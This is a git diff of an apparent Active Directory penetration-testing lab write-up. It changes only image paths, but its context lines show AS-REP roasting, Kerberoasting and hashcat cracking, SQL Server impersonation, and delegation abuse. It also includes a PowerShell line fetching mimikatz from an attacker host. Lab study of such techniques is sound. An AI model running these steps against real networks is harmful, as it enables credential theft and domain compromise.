@@ -78,7 +78,7 @@ GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -o
 .\hashcat.exe -a 0 -m 18200 .\asreproasting.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
 ```
 
-![](<../../../.gitbook/assets/image (34) (1) (1).png>)
+![](<../../../.gitbook/assets/image (34) (1) (1) (1).png>)
 
 4\. We cracked the hash within seconds of the domain user `Richard`, the password is `Sample123`.
 
@@ -226,7 +226,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-![](<../../../.gitbook/assets/image (20) (1).png>)
+![](<../../../.gitbook/assets/image (20) (1) (1).png>)
 
 5\. We can now try to impersonate `sa`, but we get an error:
 
@@ -477,7 +477,7 @@ And we received a shell as the local administrator. Gotta love PowerShell :)
 
 1. We now fully own the server `web01` which runs as a SQL Server. During our enumeration we didn't check for any SQL Links. We could do this manually in our connected mssqlclient.py session, but we could also use HeidiSQL from our Windows 10 machine. You might wonder why, but I prefer to use Heidisql, especially with bigger queries and data returned. mssqlclient.py for example returns big tables like this on my fullscreen monitor, its unreadable:
 
-![](<../../../.gitbook/assets/image (70) (1).png>)
+![](<../../../.gitbook/assets/image (70) (1) (1).png>)
 
 To do this we need to setup a port forward since our Windows 10 machine isn't connected to the lab. We can do this with [Socat](https://github.com/3ndG4me/socat). This will make our kali listen on port `1433` and redirect all traffic to `WEB01` (`10.0.0.5`) port `1433`. The SQL Server is running on default on port 1433.
 
@@ -711,7 +711,7 @@ Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 Da
 Get-DomainComputer fake01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Select-Object samaccountname, objectsid
 ```
 
-![](<../../../.gitbook/assets/image (70).png>)
+![](<../../../.gitbook/assets/image (70) (1).png>)
 
 Now we need to create the raw security descriptor which we then will write to the attribute:
 
@@ -733,7 +733,7 @@ Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0
 
 We didn't get any output since we are in a shell. But we can check the attribute again to see of it worked:
 
-![](<../../../.gitbook/assets/image (75) (1).png>)
+![](<../../../.gitbook/assets/image (75) (1) (1).png>)
 
 Seems like it worked, now we can check the value of the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute by saving it in a variable and doing some PowerShell confu to decrypt it:
 
@@ -806,7 +806,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/mimikatz.exe","C:\users\publi
 The latest compiled version of Mimikatz doesn't work on server 2022. Compiling the latest commit with Visual Studio 2019 gave me some errors, but this [https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64](https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64) repostorie/pull request worked for me without errors! I really hate compiling tools like this, always errors :cry:
 {% endhint %}
 
-![](<../../../.gitbook/assets/image (20).png>)
+![](<../../../.gitbook/assets/image (20) (1).png>)
 
 The `pbData` field contains the encrypted data and the `guidMasterKey` contains the GUID of the key needed to decrypt it.
 
@@ -941,7 +941,7 @@ python3 /opt/impacket/examples/GetUserSPNs.py 'secure.local/Administrator' -dc-i
 .\hashcat.exe -a 0 -m 13100 .\kerberoast.txt .\wordlists\rockyou.txt -r .\rules\dive.rule
 ```
 
-![](<../../../.gitbook/assets/image (21).png>)
+![](<../../../.gitbook/assets/image (21) (1).png>)
 
 We successfully cracked the password of the user `sa_admin`, the password is `Welcome123456!`
 
